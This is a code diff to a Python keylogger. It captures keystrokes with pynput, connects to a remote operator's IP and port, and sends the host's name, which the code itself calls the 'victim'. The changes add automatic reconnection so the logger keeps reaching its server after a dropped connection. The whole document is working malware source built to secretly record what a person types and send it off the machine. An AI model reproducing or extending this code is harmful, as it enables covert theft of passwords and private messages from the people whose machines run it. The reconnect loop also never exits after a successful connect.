@@ -1,23 +1,38 @@
 #!/usr/bin/env python3
 from pynput import keyboard
 from threading import Timer
+from time import sleep
 import socket
 import sys
 import errno
 
-
 class Keylogger:
     def __init__(self, interval, ip, port, h_length):
         self.interval = interval
+        self.ip = ip
+        self.port = port
         self.header_lenght = h_length
         self.log = ""
+        self.client_socket = None
+        self._connect()
+
+    def _connect(self):
         pc_name = socket.gethostname()
         self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.client_socket.connect((ip, port))
+        self.client_socket.connect((self.ip, self.port))
         self.client_socket.setblocking(False)
         self.victim = pc_name.encode('utf-8')
         usr_hlenght = f"{len(pc_name):<{self.header_lenght}}".encode('utf-8')
         self.client_socket.send(usr_hlenght + self.victim)
+
+    def _reconnect(self):
+        while True:
+            try:
+                self._connect()
+            except Exception as e:
+                print(e)
+                sleep(5)
+                continue
 
     # function to add keys 2 the current ones
     def _append_to_log(self, string):
@@ -27,6 +42,7 @@ class Keylogger:
     def _process_pressed_key(self, key):
         try:
             current_key = str(key.char)
+            print(key.char)
         except AttributeError:
             if key == key.space:
                 current_key = " "
@@ -36,6 +52,7 @@ class Keylogger:
                 current_key = "\n"
             else:
                 current_key = "<" + str(key) + ">"
+        print(current_key)
         self._append_to_log(current_key)
 
     def _send_2_server(self):
@@ -47,11 +64,10 @@ class Keylogger:
             while True:
                 username_header = self.client_socket.recv(self.header_lenght)
                 if not len(username_header):
-                    print('Connection closed by the server')
-                    sys.exit()
+                    self._reconnect()
 
                 username_length = int(username_header.decode('utf-8').strip())
-                username = self.client_socket.recv(username_length).decode('utf-8')
+                # username = self.client_socket.recv(username_length).decode('utf-8')
                 message_header = self.client_socket.recv(self.header_lenght)
                 message_length = int(message_header.decode('utf-8').strip())
                 message = self.client_socket.recv(message_length).decode('utf-8')
